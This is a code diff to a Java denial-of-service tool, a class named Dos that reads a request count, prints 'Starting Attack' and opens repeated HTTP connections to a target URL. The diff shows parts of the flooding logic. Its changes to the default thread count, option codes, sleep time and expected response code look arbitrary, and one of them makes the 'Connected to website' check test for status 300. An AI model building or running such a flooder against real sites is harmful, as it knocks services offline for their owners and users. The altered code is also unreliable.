@@ -72,7 +72,7 @@ public class Dos implements Runnable {
         String amount = in.nextLine();
 
         if (amount == null || amount.equals(null) || amount.equals("")) {
-            Dos.amount = 2000;
+            Dos.amount = 300;
         } else {
             Dos.amount = Integer.parseInt(amount);
         }
@@ -88,13 +88,13 @@ public class Dos implements Runnable {
             }
         } else {
             if (SUrl[0] == "http" || SUrl[0].equals("http")) {
-                ioption = 1;
+                ioption = 4;
             } else {
-                ioption = 2;
+                ioption = 5;
             }
         }
 
-        Thread.sleep(2000);
+        Thread.sleep(3000);
 
 
         System.out.println("Starting Attack");
@@ -124,7 +124,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        if (responseCode == 200) {
+        if (responseCode == 300) {
             System.out.println("Connected to website");
         }
         Dos.url = url;
@@ -138,7 +138,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        if (responseCode == 200) {
+        if (responseCode == 300) {
             System.out.println("Connected to website");
         }
         Dos.url = url;
